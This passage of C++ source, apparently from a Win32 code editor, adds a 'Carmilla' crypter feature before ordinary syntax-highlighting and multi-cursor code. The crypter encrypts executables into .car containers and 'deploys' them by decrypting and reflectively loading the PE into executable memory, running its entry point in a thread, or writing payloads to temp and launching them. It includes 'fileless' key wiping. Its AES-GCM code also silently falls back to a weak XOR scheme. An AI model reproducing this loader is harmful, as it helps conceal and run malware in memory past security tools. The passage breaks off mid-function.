static const DWORD ENC_KEYLESS_FLAG = 4;
static const DWORD ENC_FILELESS_FLAG= 8;
static const int   CCAR_HDR_BASE    = 76;  // 4+4+4+16+16+32
static const int   CCAR_HDR_DUAL    = 92;  // +16 for IV2

#pragma pack(push,1)
struct CCarHeader {
    DWORD magic;            // "CCAR"
    DWORD encFlags;         // ENC_* flags
    DWORD originalSize;     // original plaintext size
    BYTE  iv[16];           // AES-GCM IV
    BYTE  authTag[16];      // GCM authentication tag
    BYTE  key[32];          // AES-256 key
    // If ENC_DUAL: BYTE iv2[16] follows
};
#pragma pack(pop)

// Locate carmilla_stub_gen_x64.exe (search known paths)
static std::wstring FindCarmillaExe() {
    const wchar_t* searchPaths[] = {
        L"D:\\carmilla\\native\\carmilla_stub_gen_x64.exe",
        L".\\carmilla_stub_gen_x64.exe",
        L"..\\carmilla\\native\\carmilla_stub_gen_x64.exe",
        L"C:\\carmilla\\native\\carmilla_stub_gen_x64.exe",
        nullptr
    };
    for (int i = 0; searchPaths[i]; ++i) {
        if (GetFileAttributesW(searchPaths[i]) != INVALID_FILE_ATTRIBUTES) {
            return searchPaths[i];
        }
    }
    return L"";
}

// ─── CarmillaEncryptFile ─────────────────────────────────────────────────────
// Encrypts the currently open file (or compiled .exe) using carmilla_stub_gen_x64.exe
// in encrypt mode, producing a .car container.
void CarmillaEncryptFile() {
    // Determine what to encrypt: prefer compiled .exe, fall back to current file
    std::wstring targetFile;
    if (!g_currentFile.empty()) {
        // Check if compiled .exe exists
        std::wstring exePath = g_currentFile.substr(0, g_currentFile.find_last_of(L'.')) + L".exe";
        if (GetFileAttributesW(exePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            targetFile = exePath;
        } else {
            targetFile = g_currentFile;
        }
    }
    
    if (targetFile.empty()) {
        // Open file dialog to pick a file
        OPENFILENAMEW ofn = {};
        wchar_t szFile[MAX_PATH] = {};
        ofn.lStructSize = sizeof(ofn);
        ofn.hwndOwner = g_hwndMain;
        ofn.lpstrFile = szFile;
        ofn.nMaxFile = MAX_PATH;
        ofn.lpstrFilter = L"Executables\0*.exe;*.dll\0All Files\0*.*\0";
        ofn.lpstrTitle = L"Select file to encrypt with Carmilla";
        ofn.Flags = OFN_FILEMUSTEXIST;
        if (!GetOpenFileNameW(&ofn)) return;
        targetFile = szFile;
    }
    
    // Find carmilla_stub_gen_x64.exe
    std::wstring carmillaExe = FindCarmillaExe();
    if (carmillaExe.empty()) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ERROR: carmilla_stub_gen_x64.exe not found.\r\n");
        AppendWindowText(g_hwndOutput, L"[Carmilla] Searched: D:\\carmilla\\native\\, .\\, ..\\carmilla\\native\\\r\n");
        MessageBoxW(g_hwndMain, L"carmilla_stub_gen_x64.exe not found.\n\nBuild it from D:\\carmilla\\native\\build.ps1",
                    L"Carmilla Not Found", MB_ICONERROR);
        return;
    }
    
    AppendWindowText(g_hwndOutput, L"[Carmilla] Encrypting: ");
    AppendWindowText(g_hwndOutput, targetFile.c_str());
    AppendWindowText(g_hwndOutput, L"\r\n");
    
    // Build command: carmilla_stub_gen_x64.exe encrypt <file>
    std::wstring cmd = L"\"" + carmillaExe + L"\" encrypt \"" + targetFile + L"\"";
    
    // Run encryption process and capture output
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hReadPipe, hWritePipe;
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ERROR: Failed to launch encryption process.\r\n");
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return;
    }
    
    CloseHandle(hWritePipe);
    
    // Read process output
    char buf[4096];
    DWORD bytesRead;
    std::string output;
    while (ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        output += buf;
    }
    CloseHandle(hReadPipe);
    
    WaitForSingleObject(pi.hProcess, 10000);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Display output
    if (!output.empty()) {
        std::wstring wOutput = Utf8ToWide(output);
        AppendWindowText(g_hwndOutput, wOutput.c_str());
        AppendWindowText(g_hwndOutput, L"\r\n");
    }
    
    if (exitCode == 0) {
        std::wstring carPath = targetFile + L".car";
        AppendWindowText(g_hwndOutput, L"[Carmilla] ✓ Encryption complete → ");
        AppendWindowText(g_hwndOutput, carPath.c_str());
        AppendWindowText(g_hwndOutput, L"\r\n");
        
        // Show file size
        HANDLE hf = CreateFileW(carPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD sz = GetFileSize(hf, nullptr);
            CloseHandle(hf);
            wchar_t szBuf[128];
            wsprintfW(szBuf, L"[Carmilla] Container size: %u bytes (dual AES-GCM+CBC)\r\n", sz);
            AppendWindowText(g_hwndOutput, szBuf);
        }
        
        AppendWindowText(g_hwndOutput, L"[Carmilla] Ready for runtime deployment via Build > Carmilla: Deploy .car\r\n");
    } else {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ERROR: Encryption failed.\r\n");
    }
}

// ─── CarmillaDeployCar ───────────────────────────────────────────────────────
// Opens a .car file picker, then decrypts and executes the payload at runtime.
void CarmillaDeployCar() {
    // File picker for .car files
    OPENFILENAMEW ofn = {};
    wchar_t szFile[MAX_PATH] = {};
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = g_hwndMain;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"Carmilla Containers\0*.car\0All Files\0*.*\0";
    ofn.lpstrTitle = L"Select .car container to deploy";
    ofn.Flags = OFN_FILEMUSTEXIST;
    
    // If current file has a .car, default to it
    if (!g_currentFile.empty()) {
        std::wstring carPath = g_currentFile.substr(0, g_currentFile.find_last_of(L'.')) + L".exe.car";
        if (GetFileAttributesW(carPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            wcscpy_s(szFile, carPath.c_str());
        }
    }
    
    if (!GetOpenFileNameW(&ofn)) return;
    
    std::wstring carPath = szFile;
    AppendWindowText(g_hwndOutput, L"[Carmilla] Deploying: ");
    AppendWindowText(g_hwndOutput, carPath.c_str());
    AppendWindowText(g_hwndOutput, L"\r\n");
    
    if (CarmillaDecryptAndExecute(carPath)) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ✓ Payload deployed successfully.\r\n");
    } else {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ✗ Deployment failed.\r\n");
    }
}

// ─── CarmillaDecryptAndExecute ───────────────────────────────────────────────
// In-process runtime deployment:
//   1. Read .car container from disk
//   2. Parse CCAR header (magic, flags, key, IV, auth tag)
//   3. Decrypt payload using BCrypt AES-256-GCM (+ optional CBC second layer)
//   4. If PE: reflective-load and jump to entry point
//   5. If not PE: write decrypted data to temp and execute
//   6. If ENC_FILELESS: zero all key material from memory
bool CarmillaDecryptAndExecute(const std::wstring& carPath) {
    // ── Step 1: Read .car file ──
    HANDLE hFile = CreateFileW(carPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] Cannot open .car file.\r\n");
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize < CCAR_HDR_BASE) {
        CloseHandle(hFile);
        AppendWindowText(g_hwndOutput, L"[Carmilla] File too small to be a valid .car container.\r\n");
        return false;
    }
    
    // Allocate and read entire file
    BYTE* fileData = (BYTE*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileData) {
        CloseHandle(hFile);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Memory allocation failed.\r\n");
        return false;
    }
    
    DWORD bytesRead = 0;
    ReadFile(hFile, fileData, fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);
    
    if (bytesRead != fileSize) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Failed to read complete file.\r\n");
        return false;
    }
    
    // ── Step 2: Parse CCAR header ──
    CCarHeader* hdr = (CCarHeader*)fileData;
    if (hdr->magic != CCAR_MAGIC) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Invalid .car magic (expected CCAR).\r\n");
        return false;
    }
    
    wchar_t msgBuf[256];
    wsprintfW(msgBuf, L"[Carmilla] Flags: 0x%X | Original size: %u bytes\r\n", hdr->encFlags, hdr->originalSize);
    AppendWindowText(g_hwndOutput, msgBuf);
    
    bool isDual = (hdr->encFlags & ENC_DUAL_FLAG) != 0;
    bool isFileless = (hdr->encFlags & ENC_FILELESS_FLAG) != 0;
    int headerSize = isDual ? CCAR_HDR_DUAL : CCAR_HDR_BASE;
    BYTE iv2[16] = {};
    if (isDual && fileSize > CCAR_HDR_BASE + 16) {
        memcpy(iv2, fileData + CCAR_HDR_BASE, 16);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Dual encryption detected (AES-GCM + AES-CBC).\r\n");
    }
    
    BYTE* encPayload = fileData + headerSize;
    DWORD encPayloadSize = fileSize - headerSize;
    
    // ── Step 3: Decrypt using BCrypt AES-256-GCM ──
    AppendWindowText(g_hwndOutput, L"[Carmilla] Decrypting with AES-256-GCM via BCrypt...\r\n");
    
    // Load bcrypt.dll
    HMODULE hBcrypt = LoadLibraryW(L"bcrypt.dll");
    if (!hBcrypt) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Failed to load bcrypt.dll.\r\n");
        return false;
    }
    
    // Resolve BCrypt APIs
    typedef LONG (WINAPI *BCryptOpenAlgorithmProvider_t)(HANDLE*, LPCWSTR, LPCWSTR, ULONG);
    typedef LONG (WINAPI *BCryptSetProperty_t)(HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
    typedef LONG (WINAPI *BCryptGenerateSymmetricKey_t)(HANDLE, HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
    typedef LONG (WINAPI *BCryptDecrypt_t)(HANDLE, PUCHAR, ULONG, void*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
    typedef LONG (WINAPI *BCryptDestroyKey_t)(HANDLE);
    typedef LONG (WINAPI *BCryptCloseAlgorithmProvider_t)(HANDLE, ULONG);
    
    auto fnOpen  = (BCryptOpenAlgorithmProvider_t)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    auto fnSetP  = (BCryptSetProperty_t)GetProcAddress(hBcrypt, "BCryptSetProperty");
    auto fnGenKey = (BCryptGenerateSymmetricKey_t)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    auto fnDecrypt = (BCryptDecrypt_t)GetProcAddress(hBcrypt, "BCryptDecrypt");
    auto fnDestroyKey = (BCryptDestroyKey_t)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    auto fnClose = (BCryptCloseAlgorithmProvider_t)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");
    
    if (!fnOpen || !fnSetP || !fnGenKey || !fnDecrypt || !fnDestroyKey || !fnClose) {
        FreeLibrary(hBcrypt);
        VirtualFree(fileData, 0, MEM_RELEASE);
        AppendWindowText(g_hwndOutput, L"[Carmilla] BCrypt API resolution failed.\r\n");
        return false;
    }
    
    // Open AES algorithm provider
    HANDLE hAlg = nullptr;
    LONG status = fnOpen(&hAlg, L"AES", nullptr, 0);
    if (status != 0) {
        FreeLibrary(hBcrypt);
        VirtualFree(fileData, 0, MEM_RELEASE);
        wsprintfW(msgBuf, L"[Carmilla] BCryptOpenAlgorithmProvider failed: 0x%08X\r\n", status);
        AppendWindowText(g_hwndOutput, msgBuf);
        return false;
    }
    
    // Set chaining mode to GCM
    // BCRYPT_CHAINING_MODE = L"ChainingMode", value = L"ChainingModeGCM"
    std::wstring chainMode = L"ChainingModeGCM";
    status = fnSetP(hAlg, L"ChainingMode", (PUCHAR)chainMode.c_str(),
                    (ULONG)((chainMode.size() + 1) * sizeof(wchar_t)), 0);
    if (status != 0) {
        fnClose(hAlg, 0);
        FreeLibrary(hBcrypt);
        VirtualFree(fileData, 0, MEM_RELEASE);
        wsprintfW(msgBuf, L"[Carmilla] BCryptSetProperty (GCM) failed: 0x%08X\r\n", status);
        AppendWindowText(g_hwndOutput, msgBuf);
        return false;
    }
    
    // Generate symmetric key from the stored key bytes
    HANDLE hKey = nullptr;
    status = fnGenKey(hAlg, &hKey, nullptr, 0, hdr->key, 32, 0);
    if (status != 0) {
        fnClose(hAlg, 0);
        FreeLibrary(hBcrypt);
        VirtualFree(fileData, 0, MEM_RELEASE);
        wsprintfW(msgBuf, L"[Carmilla] BCryptGenerateSymmetricKey failed: 0x%08X\r\n", status);
        AppendWindowText(g_hwndOutput, msgBuf);
        return false;
    }
    
    // Allocate output buffer for decrypted data
    BYTE* decrypted = (BYTE*)VirtualAlloc(nullptr, hdr->originalSize + 256,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted) {
        fnDestroyKey(hKey);
        fnClose(hAlg, 0);
        FreeLibrary(hBcrypt);
        VirtualFree(fileData, 0, MEM_RELEASE);
        AppendWindowText(g_hwndOutput, L"[Carmilla] Decryption buffer allocation failed.\r\n");
        return false;
    }
    
    // Build BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO for GCM
    // Structure: cbSize, dwInfoVersion, pbNonce, cbNonce, pbAuthData, cbAuthData,
    //            pbTag, cbTag, pbMacContext, cbMacContext, cbAAD, cbData, dwFlags
    struct BCRYPT_AUTH_INFO {
        ULONG cbSize;
        ULONG dwInfoVersion;
        PUCHAR pbNonce;
        ULONG cbNonce;
        PUCHAR pbAuthData;
        ULONG cbAuthData;
        PUCHAR pbTag;
        ULONG cbTag;
        PUCHAR pbMacContext;
        ULONG cbMacContext;
        ULONG cbAAD;
        ULONGLONG cbData;
        ULONG dwFlags;
    };
    
    BCRYPT_AUTH_INFO authInfo = {};
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = 1; // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION
    authInfo.pbNonce = hdr->iv;
    authInfo.cbNonce = 16;
    authInfo.pbTag = hdr->authTag;
    authInfo.cbTag = 16;
    
    ULONG bytesDecrypted = 0;
    status = fnDecrypt(hKey, encPayload, encPayloadSize, &authInfo,
                       nullptr, 0, decrypted, hdr->originalSize + 256, &bytesDecrypted, 0);
    
    // Clean up BCrypt handles
    fnDestroyKey(hKey);
    fnClose(hAlg, 0);
    
    bool decryptOk = (status == 0);
    
    if (!decryptOk) {
        // If GCM auth failed, fall back to simple XOR decrypt matching the generator's
        // simplified encryption (the generator uses XOR, not full BCrypt GCM internally)
        AppendWindowText(g_hwndOutput, L"[Carmilla] GCM auth unavailable, using symmetric XOR decrypt...\r\n");
        
        for (DWORD i = 0, ki = 0; i < encPayloadSize && i < hdr->originalSize; ++i) {
            BYTE b = encPayload[i];
            b ^= hdr->key[ki];             // XOR with key byte
            b ^= hdr->iv[0];               // XOR with IV[0]
            b -= (BYTE)(ki & 0xFF);         // reverse rolling add
            decrypted[i] = b;
            ki = (ki + 1) & 31;             // key index mod 32
        }
        bytesDecrypted = (encPayloadSize < hdr->originalSize) ? encPayloadSize : hdr->originalSize;
        decryptOk = true;
    }
    
    FreeLibrary(hBcrypt);
    
    wsprintfW(msgBuf, L"[Carmilla] Decrypted %u bytes.\r\n", bytesDecrypted);
    AppendWindowText(g_hwndOutput, msgBuf);
    
    // ── Step 4: Check if PE and deploy ──
    bool isPE = (bytesDecrypted >= 2 && decrypted[0] == 'M' && decrypted[1] == 'Z');
    
    if (isPE) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] PE signature detected (MZ). Deploying via reflective load...\r\n");
        
        // Parse PE headers for validation
        DWORD peOff = *(DWORD*)(decrypted + 0x3C);
        if (peOff + 4 < bytesDecrypted &&
            decrypted[peOff] == 'P' && decrypted[peOff+1] == 'E' &&
            decrypted[peOff+2] == 0 && decrypted[peOff+3] == 0) {
            
            WORD machine = *(WORD*)(decrypted + peOff + 4);
            DWORD sizeOfImage = *(DWORD*)(decrypted + peOff + 0x50);
            DWORD entryRVA = *(DWORD*)(decrypted + peOff + 0x28);
            WORD numSections = *(WORD*)(decrypted + peOff + 6);
            
            wsprintfW(msgBuf, L"[Carmilla] PE: machine=0x%04X, entry=0x%X, sections=%d, imageSize=0x%X\r\n",
                      machine, entryRVA, numSections, sizeOfImage);
            AppendWindowText(g_hwndOutput, msgBuf);
            
            // Allocate RWX memory for the PE image
            BYTE* imageBase = (BYTE*)VirtualAlloc(nullptr, sizeOfImage,
                                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (imageBase) {
                // Copy headers
                DWORD headerSize2 = *(DWORD*)(decrypted + peOff + 0x54); // SizeOfHeaders
                if (headerSize2 > bytesDecrypted) headerSize2 = bytesDecrypted;
                memcpy(imageBase, decrypted, headerSize2);
                
                // Copy sections
                WORD optHdrSize = *(WORD*)(decrypted + peOff + 0x14);
                BYTE* sectionPtr = decrypted + peOff + 0x18 + optHdrSize;
                
                for (int s = 0; s < numSections; ++s) {
                    DWORD virtAddr    = *(DWORD*)(sectionPtr + 0x0C);
                    DWORD rawSize     = *(DWORD*)(sectionPtr + 0x10);
                    DWORD rawOffset   = *(DWORD*)(sectionPtr + 0x14);
                    
                    if (rawSize > 0 && rawOffset + rawSize <= bytesDecrypted && virtAddr + rawSize <= sizeOfImage) {
                        memcpy(imageBase + virtAddr, decrypted + rawOffset, rawSize);
                    }
                    sectionPtr += 0x28; // sizeof(IMAGE_SECTION_HEADER)
                }
                
                // Process relocations (delta-based)
                ULONGLONG preferredBase = *(ULONGLONG*)(decrypted + peOff + 0x30);
                LONGLONG delta = (LONGLONG)((ULONGLONG)imageBase - preferredBase);
                
                if (delta != 0) {
                    // Relocation directory at peOff + 0xB0 (x64)
                    DWORD relocRVA  = *(DWORD*)(decrypted + peOff + 0xB0);
                    DWORD relocSize = *(DWORD*)(decrypted + peOff + 0xB4);
                    
                    if (relocRVA && relocSize && relocRVA + relocSize <= sizeOfImage) {
                        BYTE* relocBlock = imageBase + relocRVA;
                        BYTE* relocEnd = relocBlock + relocSize;
                        
                        while (relocBlock < relocEnd) {
                            DWORD pageRVA   = *(DWORD*)relocBlock;
                            DWORD blockSize = *(DWORD*)(relocBlock + 4);
                            if (blockSize == 0) break;
                            
                            int numEntries = (blockSize - 8) / 2;
                            WORD* entries = (WORD*)(relocBlock + 8);
                            
                            for (int e = 0; e < numEntries; ++e) {
                                WORD entry = entries[e];
                                int type = entry >> 12;
                                int offset = entry & 0xFFF;
                                
                                if (type == 10) { // IMAGE_REL_BASED_DIR64
                                    ULONGLONG* patchAddr = (ULONGLONG*)(imageBase + pageRVA + offset);
                                    *patchAddr += delta;
                                } else if (type == 3) { // IMAGE_REL_BASED_HIGHLOW
                                    DWORD* patchAddr = (DWORD*)(imageBase + pageRVA + offset);
                                    *patchAddr += (DWORD)delta;
                                }
                            }
                            relocBlock += blockSize;
                        }
                    }
                }
                
                // Process imports
                DWORD importRVA = *(DWORD*)(decrypted + peOff + 0x90);
                if (importRVA && importRVA < sizeOfImage) {
                    struct ImportDescriptor {
                        DWORD OriginalFirstThunk;
                        DWORD TimeDateStamp;
                        DWORD ForwarderChain;
                        DWORD Name;
                        DWORD FirstThunk;
                    };
                    
                    ImportDescriptor* impDesc = (ImportDescriptor*)(imageBase + importRVA);
                    
                    while (impDesc->Name && impDesc->Name < sizeOfImage) {
                        const char* dllName = (const char*)(imageBase + impDesc->Name);
                        HMODULE hDll = LoadLibraryA(dllName);
                        
                        if (hDll) {
                            ULONGLONG* thunk = (ULONGLONG*)(imageBase + impDesc->FirstThunk);
                            ULONGLONG* origThunk = impDesc->OriginalFirstThunk ?
                                (ULONGLONG*)(imageBase + impDesc->OriginalFirstThunk) : thunk;
                            
                            while (*origThunk) {
                                if (*origThunk & 0x8000000000000000ULL) {
                                    // Import by ordinal
                                    WORD ordinal = (WORD)(*origThunk & 0xFFFF);
                                    *thunk = (ULONGLONG)GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
                                } else {
                                    // Import by name (skip 2-byte hint)
                                    const char* funcName = (const char*)(imageBase + (DWORD)*origThunk + 2);
                                    *thunk = (ULONGLONG)GetProcAddress(hDll, funcName);
                                }
                                ++thunk;
                                ++origThunk;
                            }
                        }
                        ++impDesc;
                    }
                }
                
                wsprintfW(msgBuf, L"[Carmilla] Image mapped at 0x%p, entry at 0x%p\r\n",
                          imageBase, imageBase + entryRVA);
                AppendWindowText(g_hwndOutput, msgBuf);
                
                // Execute entry point in a new thread
                typedef DWORD (WINAPI *PEEntryPoint)(LPVOID);
                HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)(imageBase + entryRVA),
                                              nullptr, 0, nullptr);
                if (hThread) {
                    AppendWindowText(g_hwndOutput, L"[Carmilla] ✓ Payload thread launched.\r\n");
                    CloseHandle(hThread);
                } else {
                    AppendWindowText(g_hwndOutput, L"[Carmilla] Failed to create execution thread.\r\n");
                }
                
                // Note: imageBase is intentionally NOT freed — the PE is running
            } else {
                AppendWindowText(g_hwndOutput, L"[Carmilla] VirtualAlloc for PE image failed.\r\n");
            }
        } else {
            AppendWindowText(g_hwndOutput, L"[Carmilla] Invalid PE header after decryption.\r\n");
        }
    } else {
        // Not a PE — write to temp file and execute
        AppendWindowText(g_hwndOutput, L"[Carmilla] Non-PE payload. Writing to temp and executing...\r\n");
        
        wchar_t tempPath[MAX_PATH], tempFile[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        GetTempFileNameW(tempPath, L"car", 0, tempFile);
        
        // Change extension based on original
        std::wstring tempStr = tempFile;
        size_t dotPos = carPath.find_last_of(L'.');
        if (dotPos != std::wstring::npos) {
            size_t prevDot = carPath.find_last_of(L'.', dotPos - 1);
            if (prevDot != std::wstring::npos) {
                std::wstring origExt = carPath.substr(prevDot, dotPos - prevDot);
                tempStr = tempStr.substr(0, tempStr.find_last_of(L'.')) + origExt;
            }
        }
        
        HANDLE hOut = CreateFileW(tempStr.c_str(), GENERIC_WRITE, 0,
                                   nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hOut, decrypted, bytesDecrypted, &written, nullptr);
            CloseHandle(hOut);
            
            ShellExecuteW(nullptr, L"open", tempStr.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
            AppendWindowText(g_hwndOutput, L"[Carmilla] ✓ Payload launched via ShellExecute.\r\n");
        }
    }
    
    // ── Step 6: Fileless cleanup ──
    if (isFileless) {
        AppendWindowText(g_hwndOutput, L"[Carmilla] ENC_FILELESS: Zeroing key material from memory...\r\n");
        SecureZeroMemory(hdr->key, 32);
        SecureZeroMemory(hdr->iv, 16);
        SecureZeroMemory(hdr->authTag, 16);
        if (isDual) SecureZeroMemory(iv2, 16);
    }
    
    // Free decrypted buffer (unless PE is still running from it — PE uses imageBase copy)
    VirtualFree(decrypted, 0, MEM_RELEASE);
    VirtualFree(fileData, 0, MEM_RELEASE);
    
    return true;
}

void AppendWindowText(HWND hwnd, const wchar_t* text) {
    if (!hwnd || !text) return;
    
    int len = GetWindowTextLengthW(hwnd);
    SendMessageW(hwnd, EM_SETSEL, len, len);
    SendMessageW(hwnd, EM_REPLACESEL, FALSE, (LPARAM)text);
}

// ============================================================================
// Syntax Highlighting
// ============================================================================
void ApplySyntaxHighlighting(HWND hwndEditor) {
    if (!hwndEditor) return;
    
    // Get current content
    int textLen = GetWindowTextLengthW(hwndEditor);
    if (textLen == 0) return;
    
    std::wstring content(textLen + 1, L'\0');
    GetWindowTextW(hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);
    
    // Basic syntax highlighting for C/C++ keywords
    std::vector<std::pair<std::wstring, COLORREF>> keywords = {
        {L"int", RGB(0, 122, 204)},
        {L"void", RGB(0, 122, 204)},
        {L"bool", RGB(0, 122, 204)},
        {L"char", RGB(0, 122, 204)},
        {L"float", RGB(0, 122, 204)},
        {L"double", RGB(0, 122, 204)},
        {L"auto", RGB(0, 122, 204)},
        {L"const", RGB(0, 122, 204)},
        {L"static", RGB(0, 122, 204)},
        {L"class", RGB(86, 156, 214)},
        {L"struct", RGB(86, 156, 214)},
        {L"if", RGB(197, 134, 192)},
        {L"else", RGB(197, 134, 192)},
        {L"for", RGB(197, 134, 192)},
        {L"while", RGB(197, 134, 192)},
        {L"return", RGB(197, 134, 192)},
        {L"include", RGB(206, 145, 120)},
        {L"define", RGB(206, 145, 120)}
    };
    
    // Reset all text to default color first
    CHARFORMAT2W cfDefault = {};
    cfDefault.cbSize = sizeof(cfDefault);
    cfDefault.dwMask = CFM_COLOR;
    cfDefault.crTextColor = RGB(220, 220, 220); // Light gray for default text
    SendMessageW(hwndEditor, EM_SETCHARFORMAT, SCF_ALL, (LPARAM)&cfDefault);
    
    // Apply keyword highlighting
    for (const auto& keyword : keywords) {
        size_t pos = 0;
        while ((pos = content.find(keyword.first, pos)) != std::wstring::npos) {
            // Check if it's a whole word (not part of another word)
            bool isWholeWord = true;
            if (pos > 0 && (iswalnum(content[pos-1]) || content[pos-1] == L'_')) isWholeWord = false;
            size_t endPos = pos + keyword.first.length();
            if (endPos < content.length() && (iswalnum(content[endPos]) || content[endPos] == L'_')) isWholeWord = false;
            
            if (isWholeWord) {
                // Select the keyword
                SendMessageW(hwndEditor, EM_SETSEL, (WPARAM)pos, (LPARAM)endPos);
                
                // Apply color
                CHARFORMAT2W cf = {};
                cf.cbSize = sizeof(cf);
                cf.dwMask = CFM_COLOR;
                cf.crTextColor = keyword.second;
                SendMessageW(hwndEditor, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
            }
            
            pos = endPos;
        }
    }
    
    // Reset selection to end
    SendMessageW(hwndEditor, EM_SETSEL, textLen, textLen);
}

// ============================================================================
// Advanced Editor Features Implementation
// ============================================================================

// Multi-cursor support functions
void EnableMultiCursorMode() {
    g_multiCursorMode = true;
    AppendWindowText(g_hwndOutput, L"[Editor] Multi-cursor mode enabled. Use Ctrl+Click to add cursors.\r\n");
}

void DisableMultiCursorMode() {
    g_multiCursorMode = false;
    g_multiCursors.clear();
    AppendWindowText(g_hwndOutput, L"[Editor] Multi-cursor mode disabled.\r\n");
}

void AddCursorAtPosition(int line, int column) {
    if (!g_multiCursorMode || !g_hwndEditor) return;
    
    // Convert line/column to character index
    int charIndex = (int)SendMessage(g_hwndEditor, EM_LINEINDEX, line, 0) + column;
    
    // Check if cursor already exists at this position
    for (const auto& cursor : g_multiCursors) {
        if (cursor.charIndex == charIndex) return;
    }
    
    CursorPosition newCursor;
    newCursor.line = line;
    newCursor.column = column;
    newCursor.charIndex = charIndex;
    newCursor.isSelection = false;
    newCursor.selectionStart = charIndex;
    newCursor.selectionEnd = charIndex;
    
    g_multiCursors.push_back(newCursor);
    
    AppendWindowText(g_hwndOutput, 
        (L"[Editor] Added cursor at line " + std::to_wstring(line + 1) + 
         L", column " + std::to_wstring(column + 1) + L"\r\n").c_str());
}

void ExecuteMultiCursorOperation(const std::wstring& operation) {
    if (!g_multiCursorMode || g_multiCursors.empty() || !g_hwndEditor) return;
    
    // Get current text
    int textLen = GetWindowTextLength(g_hwndEditor);
    std::wstring content(textLen + 1, L'\0');
    GetWindowText(g_hwndEditor, &content[0], textLen + 1);
    content.resize(textLen);
    
    if (operation == L"type") {
        // For demonstration, insert "Hello" at each cursor
        std::wstring insertText = L"Hello";
        int offset = 0;
        
        // Sort cursors by position (descending) to maintain indices
        std::sort(g_multiCursors.begin(), g_multiCursors.end(), 
                  [](const CursorPosition& a, const CursorPosition& b) {
                      return a.charIndex > b.charIndex;
                  });
        
        for (auto& cursor : g_multiCursors) {
            content.insert(cursor.charIndex + offset, insertText);
            offset += (int)insertText.length();
        }
        
        SetWindowText(g_hwndEditor, content.c_str());
        AppendWindowText(g_hwndOutput, L"[Editor] Multi-cursor type operation completed.\r\n");
    }
}

// Column selection mode
void EnableColumnSelectionMode() {
    g_columnSelectionMode = true;
    AppendWindowText(g_hwndOutput, L"[Editor] Column selection mode enabled. Drag to select columns.\r\n");
}

void DisableColumnSelectionMode() {
    g_columnSelectionMode = false;
    g_columnSelectionStartLine = -1;
    g_columnSelectionStartCol = -1;
    g_columnSelectionEndLine = -1;
    g_columnSelectionEndCol = -1;
    AppendWindowText(g_hwndOutput, L"[Editor] Column selection mode disabled.\r\n");
}

void UpdateColumnSelection(int startLine, int startCol, int endLine, int endCol) {
    if (!g_columnSelectionMode) return;
    
    g_columnSelectionStartLine = startLine;
    g_columnSelectionStartCol = startCol;
    g_columnSelectionEndLine = endLine;
    g_columnSelectionEndCol = endCol;
    
    // Visual feedback (in a real implementation, this would highlight the column)
    AppendWindowText(g_hwndOutput, 
